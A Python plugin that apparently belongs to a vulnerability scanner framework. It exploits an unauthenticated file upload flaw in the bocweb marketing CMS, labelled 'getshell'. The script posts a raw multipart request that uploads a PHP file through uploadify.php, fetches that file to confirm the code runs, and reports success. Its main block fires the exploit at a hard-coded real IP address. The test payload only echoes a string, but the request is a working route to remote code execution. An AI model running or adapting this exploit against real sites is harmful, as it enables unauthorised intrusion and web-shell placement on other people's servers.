#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = P4NY
#_PlugName_ = 博采微营销网站(bocweb)前台getshell
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0124987

import re,urlparse

def assign(service, arg):
    if service == 'bocweb':
        return True, arg

def audit(arg):
    p=urlparse.urlparse(arg)
    raw="""POST /bocadmin/j/uploadify.php HTTP/1.1
Host: {netloc}
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------32382156818478
Content-Length: 337

-----------------------------32382156818478
Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.php\"
Content-Type: application/octet-stream

<?php
echo \"vul_test_bbb\";
?>

-----------------------------32382156818478
Content-Disposition: form-data; name="folder"

/
-----------------------------32382156818478
Content-Disposition: form-data; name="submit"

Submit
-----------------------------32382156818478--"""
    code, head, res, errcode, _ = curl.curl2(arg + 'bocadmin/j/uploadify.php', raw=raw.format(scheme=p.scheme,netloc=p.netloc));
    if code == 200 and res:
            n_url='http://%s/test.php' % (p.netloc)
            code, head, res, errcode, _ =curl.curl2(n_url)
            if code==200 and 'vul_test_bbb' in res:
                security_hole(arg + ":Upload File at " + n_url)
                
if __name__ == '__main__':
    from dummy import *
    audit(assign('bocweb','http://121.41.22.178/')[1])